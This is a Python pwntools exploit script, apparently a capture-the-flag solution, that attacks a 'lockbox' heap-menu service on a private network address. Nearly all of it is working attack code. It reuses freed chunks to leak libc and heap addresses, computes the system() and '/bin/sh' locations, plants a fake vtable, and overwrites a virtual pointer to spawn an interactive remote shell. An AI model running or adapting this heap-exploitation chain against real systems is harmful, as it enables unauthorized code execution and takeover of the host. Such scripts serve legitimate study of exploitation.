from pwn import *

r = remote("172.16.37.128", 9941)

def open_lockbox(box, size):
    r.sendline("1")
    r.sendline(str(box))
    r.sendline(str(size))

def delete_lockbox(box):
    r.sendline("4")
    r.sendline(str(box))

def get_item(box, value):
    r.sendline("3")
    r.sendline(str(box))
    r.sendline(str(value))

def add_item(box, value):
    r.sendline("2")
    r.sendline(str(box))
    r.sendline(str(value))

# Allocating the 2 chunks
open_lockbox(0, 100)
open_lockbox(1, 50)

# Freeing the 2 chunks and allocating a bigger chunk on top
delete_lockbox(1)
delete_lockbox(0)
open_lockbox(0, 150)

# Leak libc and heap address
get_item(0, 0)
r.recvuntil("lockbox[0] = ")
libc = int(r.recvline()) & 0xFFFFFFFF

get_item(0, 105)
r.recvuntil("lockbox[105] = ")
heap = int(r.recvline()) & 0xFFFFFFFF

# Calculate system and vpointer address
system = libc - 0x16a2c0 + 1
binsh = system + 0x120893
vpointer = heap - 0x1b0 + (system % 150) * 4 - 8

log.info("libc: {}".format(hex(libc)))
log.info("heap: {}".format(hex(heap)))
log.info("system: {}".format(hex(system)))
log.info("vpointer: {}".format(hex(vpointer)))

# Create the fake vtable
r.sendline("2")
r.sendline("0")
r.sendline(str(system))

# find suitable m_size
size = -1
for i in range(103, 30000):
    if vpointer % i == 102:
        size = i
        break

if size == -1:
    print "Error, try again"
    exit()

# Reallocate with new size
delete_lockbox(0)
open_lockbox(0, size)

# Modify the vpointer and call system
add_item(0, vpointer)
add_item(1, binsh)

r.interactive()
